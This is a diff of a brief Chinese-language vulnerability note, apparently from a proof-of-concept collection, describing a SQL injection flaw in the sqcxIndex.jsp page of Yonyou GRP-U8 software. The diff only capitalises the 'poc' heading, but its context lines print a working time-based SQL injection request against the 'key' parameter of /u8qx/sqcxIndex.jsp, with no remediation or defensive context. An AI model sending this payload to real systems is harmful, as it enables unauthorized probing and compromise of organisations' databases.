@@ -1,6 +1,6 @@
 ## 用友GRP-U8-sqcxIndex.jsp存在SQL注入漏洞
 
-## poc
+## POC
 ```
 GET /u8qx/sqcxIndex.jsp?key=1');+waitfor+delay+'0:0:3'-- HTTP/1.1
 Host: 
